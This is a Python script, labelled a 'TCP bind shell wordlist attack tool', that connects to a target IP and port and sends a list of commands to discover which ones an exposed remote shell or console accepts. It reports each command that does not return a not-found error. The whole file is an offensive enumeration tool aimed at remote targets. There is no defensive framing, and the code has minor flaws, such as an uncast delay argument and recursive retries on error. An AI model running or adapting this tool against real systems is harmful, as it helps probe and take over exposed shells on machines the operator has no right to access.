import socket
import sys
import os
from time import sleep
from colorama import init, Fore, Style, Back
from argparse import ArgumentParser

init(convert=True)
init(autoreset=True)

bright = Style.BRIGHT
dim = Style.DIM
red = Fore.RED + dim
green = Fore.GREEN + dim
cyan = Fore.CYAN + dim
yellow = Fore.LIGHTYELLOW_EX + dim
white = Fore.WHITE + dim

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_req(send_command):
    try:
        a = s.send(send_command)
        sleep(args.delay) # Increase if high ping for accurate printing
        data=s.recv(1024)
    except Exception as errmsg:
        print(red + "Connection error - {}".format(errmsg))
        sleep(args.delay)
        return ""

    data_readable = data.decode("utf-8")
    return data_readable

def print_statusline(msg: str):
    last_msg_length = len(print_statusline.last_msg) if hasattr(print_statusline, 'last_msg') else 0
    print(' ' * last_msg_length, end='\r')
    print(msg, end='\r')
    sys.stdout.flush()
    print_statusline.last_msg = msg

def main():
    try:
        a = s.connect((args.tcp_ip, int(args.tcp_port)))
        print("TCP Connection established with {}{}{}:{}{}".format(cyan, args.tcp_ip, white, cyan, args.tcp_port))
    except Exception as err:
        print("{}An error occurred when trying to connet to {}:{}".format(red, args.tcp_ip, args.tcp_port))
        input()
        main()

    try:
        test_commands = open(args.wordlist_file, encoding="utf-8").read().split("\n")
    except Exception as err:
        print("{}Could not open file {} - {}".format(red, args.wordlist_file, err))
        input()
        main()

    print("Loaded {}{}{} commands from {}{}\n".format(cyan, len(test_commands), Fore.RESET, cyan, args.wordlist_file))

    found_commands = []
    for command in test_commands:
        send_command = str.encode(command + "\r\n")
        data_readable = send_req(send_command)

        if not args.notfound_msg in data_readable:
            print("> Found command: {}{}{}".format(bright, cyan, command))
            found_commands.append(command)
        else:
            print_statusline("Not found: {}".format(command))

    print("\n\n{}Available commands: {}/{}".format(Back.GREEN, len(found_commands), len(test_commands)))
    input()


if __name__ == "__main__":
    cls()
    print("\n{}TCP bind shell wordlist attack tool\n\n".format(Back.CYAN))

    parser = ArgumentParser()
    parser.add_argument("-ip", dest="tcp_ip",
                        help="*Target ip")
    parser.add_argument("-port", dest="tcp_port",
                        help="*Target port")
    parser.add_argument("-w", dest="wordlist_file",
                        help="List of commands to try", default="linux-commands-merged.txt")
    parser.add_argument("-errstr", dest="notfound_msg",
                        help="Console uknown command string", default="No such command")
    parser.add_argument("-delay", dest="delay",
                        help="Delay after sending command", default=0.25)

    args = parser.parse_args()
    s = socket.socket()
    socket.socket().close()

    if not args.tcp_ip or not args.tcp_port:
        print(red + "\nYou must provide the IP and port!")
        exit()

    main()
